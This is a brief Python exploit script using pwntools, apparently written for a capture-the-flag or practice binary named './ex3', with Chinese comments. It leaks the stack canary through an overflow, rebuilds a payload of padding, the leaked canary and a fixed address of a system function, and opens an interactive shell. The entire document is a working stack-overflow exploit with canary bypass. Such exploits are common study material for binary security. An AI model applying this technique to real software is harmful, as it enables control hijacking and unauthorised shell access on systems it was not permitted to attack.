from pwn import *

system_addr = 0x080491a6
p = process("./ex3")

# 泄漏canary
a = b"A" * 101
raw_input()
p.send(a)
p.recvuntil(b"A" * 100)
# 获得canary
canary = u32(p.recv(4)) - 0x41  # 减去多出的一个"A"

payload = b"A" * 100 + p32(canary) + b"A" * 12 + p32(system_addr)
p.send(payload)
p.recv()
p.recv

p.interactive()
